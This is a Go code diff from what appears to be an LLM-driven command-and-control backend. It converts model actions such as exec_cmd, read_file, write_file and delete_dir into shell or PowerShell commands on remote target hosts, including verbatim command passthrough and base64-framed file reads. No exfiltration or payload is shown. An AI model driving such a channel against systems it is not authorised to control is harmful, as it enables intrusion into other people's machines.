+// readFileWrappedCmd emits a sentinel-wrapped, size-bounded read of the whole
+// file for editing. The content is base64 (so the control end can never mistake
+// file content for an error message), `missing` is printed when path is not a
+// regular file, and `begin`/`end` frame the payload.
+func readFileWrappedCmd(t target, path, begin, end, missing string, maxBytes int) (string, error) {
+	if t.isWindows() {
+		return t.finish(psWrappedRead(path, begin, end, missing, maxBytes))
+	}
+	return "if [ -f " + posixQuote(path) + " ] && [ -r " + posixQuote(path) + " ]; then printf '%s\\n' '" + begin +
+		"'; head -c " + strconv.Itoa(maxBytes) + " " + posixQuote(path) +
+		" | base64; printf '%s\\n' '" + end + "'; else printf '%s\\n' '" + missing + "'; fi", nil
+}
+
+// randSentinel returns a random per-call token used to frame a file read so
+// payload content can never be confused with a framing marker or error message.
+func randSentinel(prefix string) string {
+	buf := make([]byte, 8)
+	if _, err := rand.Read(buf); err != nil {
+		return "__C2EDIT_" + prefix + "_fallback__"
+	}
+	return "__C2EDIT_" + prefix + "_" + hex.EncodeToString(buf) + "__"
+}
+
+// randToken returns a short random hex token for temporary file names.
+func randToken() string {
+	buf := make([]byte, 8)
+	if _, err := rand.Read(buf); err != nil {
+		return "fallback"
+	}
+	return hex.EncodeToString(buf)
 }
 
 var (
@@ -515,10 +601,12 @@ func formatListing(output string) string {
 	}
 	if win {
 		var items []string
+		dataLines := 0
 		for _, l := range lines {
 			if strings.TrimSpace(l) == "" || strings.HasPrefix(strings.TrimSpace(l), "PSIsContainer") || strings.HasPrefix(strings.TrimSpace(l), "-") {
 				continue
 			}
+			dataLines++
 			m := winTable.FindStringSubmatch(l)
 			if m == nil {
 				continue
@@ -539,6 +627,10 @@ func formatListing(output string) string {
 		}
 		if len(items) > 0 {
 			return strings.Join(items, "\n")
+		}
+		if dataLines == 0 {
+			// Header-only output == empty directory; match the native agents.
+			return "Empty directory"
 		}
 		return output
 	}
@@ -571,39 +663,44 @@ func formatListing(output string) string {
 	return output
 }
 
-// actionToShell converts an LLM action into one shell command. edit_file is
-// handled entirely by Backend.editFile (sentinel-wrapped read + write) and
-// never reaches this function.
-func actionToShell(action string, params map[string]any, osName string) (string, error) {
+// actionToShell converts an LLM action into one shell command adapted to the
+// detected execution environment. edit_file is handled entirely by
+// Backend.editFile (sentinel-wrapped read + write) and never reaches here.
+func actionToShell(action string, params map[string]any, t target) (string, error) {
 	s := func(k string) string { return paramString(params[k]) }
 	switch action {
 	case "exec_cmd":
+		// Passed through verbatim: on a cmd.exe host the model is told the
+		// environment is "cmd", on a PowerShell host "PowerShell", so it can
+		// emit the right syntax (see the rendered system prompt).
 		return s("command"), nil
 	case "get_cwd":
-		return getCwdCmd(osName), nil
+		return getCwdCmd(t)
 	case "list_dir":
 		p := s("path")
 		if p == "" {
 			p = "."
 		}
-		return listDirCmd(osName, p)
+		return listDirCmd(t, p)
 	case "read_file":
-		return readFileCmd(osName, s("path"), s("start_line"), s("end_line"))
+		return readFileCmd(t, s("path"), s("start_line"), s("end_line"))
 	case "write_file":
 		b64 := base64.StdEncoding.EncodeToString([]byte(s("content")))
-		return writeBase64Cmd(osName, s("path"), b64)
+		return writeBase64Cmd(t, s("path"), b64)
 	case "create_file":
-		return createFileCmd(osName, s("path"))
-	case "delete_file", "delete_dir":
-		return deleteCmd(osName, s("path"))
+		return createFileCmd(t, s("path"))
+	case "delete_file":
+		return deleteCmd(t, s("path"), false)
+	case "delete_dir":
+		return deleteCmd(t, s("path"), true)
 	case "rename_file", "rename_dir":
-		return renameCmd(osName, s("path"), s("new_name"))
+		return renameCmd(t, s("path"), s("new_name"))
 	case "make_dir":
-		return makeDirCmd(osName, s("path"))
+		return makeDirCmd(t, s("path"))
 	case "copy":
-		return copyCmd(osName, s("src"), s("dest"))
+		return copyCmd(t, s("src"), s("dest"))
 	case "move":
-		return moveCmd(osName, s("src"), s("dest"))
+		return moveCmd(t, s("src"), s("dest"))
 	default:
 		return "", fmt.Errorf("unknown action: %s", action)
 	}
@@ -612,6 +709,66 @@ func actionToShell(action string, params map[string]any, osName string) (string,
 // paramString renders a tool parameter for the shell command builders. It
 // delegates to command.String so the control end has a single implementation.
 func paramString(v any) string { return command.String(v) }
+
+// isWholeFileRead reports whether a read_file request covers the whole file.
+func isWholeFileRead(params map[string]any) bool {
+	s := paramString(params["start_line"])
+	return strings.TrimSpace(s) == "" || strings.TrimSpace(s) == "0"
+}
+
+// sliceLines returns lines [startLine, endLine] (1-based, endLine<=0 = EOF) of
+// content, preserving each line's original terminator, mirroring the native
+// agents' read_file semantics. It is used for Windows shell reads, whose
+// PowerShell ReadLines/AppendLine would otherwise normalize newlines.
+func sliceLines(content, startLine, endLine string) string {
+	start := 1
+	if v := strings.TrimSpace(startLine); v != "" && v != "0" {
+		n, err := strconv.Atoi(v)
+		if err != nil || n < 1 {
+			return "Invalid start_line: " + startLine
+		}
+		start = n
+	}
+	end := 0
+	if v := strings.TrimSpace(endLine); v != "" && v != "0" {
+		if n, err := strconv.Atoi(v); err == nil && n > 0 {
+			end = n
+		}
+	}
+	var b strings.Builder
+	lineNo := 0
+	reached := false
+	done := false
+	i := 0
+	for i < len(content) {
+		j := strings.IndexByte(content[i:], '\n')
+		if j < 0 {
+			break
+		}
+		line := content[i : i+j+1]
+		i += j + 1
+		lineNo++
+		if lineNo >= start {
+			reached = true
+			if end > 0 && lineNo > end {
+				done = true
+				break
+			}
+			b.WriteString(line)
+		}
+	}
+	if !done && i < len(content) {
+		lineNo++
+		if lineNo >= start && (end == 0 || lineNo <= end) {
+			reached = true
+			b.WriteString(content[i:])
+		}
+	}
+	if !reached {
+		return fmt.Sprintf("Start line %s exceeds file line count (%d)", startLine, lineNo)
+	}
+	return b.String()
+}
 
 // truncateRunes caps s at max characters (Unicode code points), never
 // splitting a UTF-8 sequence, matching the Python agent's character semantics.
